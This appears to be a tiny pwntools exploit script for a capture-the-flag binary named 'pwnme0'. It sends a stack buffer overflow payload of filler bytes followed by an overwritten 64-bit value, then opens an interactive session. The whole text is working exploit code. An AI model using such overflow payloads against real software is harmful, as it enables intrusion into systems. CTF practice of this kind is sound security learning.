from pwn import *

b = process('./pwnme0')
banana = b'A' * (0x60 - 4)
bananaFart = 0x13370420
b.sendline(banana + p64(bananaFart))
b.interactive()